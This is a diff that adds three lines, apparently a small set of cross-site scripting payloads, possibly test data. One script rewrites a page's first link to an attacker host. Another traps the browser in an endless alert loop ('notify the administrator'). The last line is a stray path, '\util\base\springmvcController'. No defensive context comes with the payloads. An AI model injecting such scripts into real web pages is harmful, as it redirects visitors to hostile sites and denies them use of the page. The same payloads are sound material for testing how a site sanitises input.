@@ -1,0 +1,3 @@
+<script>window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="http://attacker-site.com/";}</script>
+<script>window.onload = function() {var i = 0;for(;;i++){alert("通知管理员");}}</script>
+\util\base\springmvcController
